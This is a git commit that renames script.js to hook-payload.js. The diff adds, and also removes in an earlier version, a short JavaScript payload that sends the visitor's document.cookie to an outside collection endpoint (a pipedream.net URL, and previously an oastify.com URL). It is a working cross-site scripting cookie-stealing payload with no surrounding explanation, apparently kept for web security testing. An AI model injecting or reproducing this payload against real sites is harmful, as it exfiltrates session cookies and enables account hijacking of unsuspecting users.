7cdae257b6fd9b015d755d4b276d45c614230974
bendasnake <132041377+bendasnake@users.noreply.github.com>
2023-05-02 20:09:17 -0400

    Update and rename script.js to hook-payload.js

---
+++ hook-payload.js
@@ -0,0 +1,5 @@
+var xhttp = new XMLHttpRequest();
+
+xhttp.open('GET', 'https://eo5d2j8aa1lu9ct.m.pipedream.net/?' + document.cookie, true);
+
+xhttp.send();
--- script.js
+++
@@ -1,5 +0,0 @@
-var xhttp = new XMLHttpRequest();
-
-xhttp.open('GET', 'http://y436lpjr4zkl6577bxbgoxfal1rtfi.oastify.com/?' + document.cookie, true);
-
-xhttp.send();
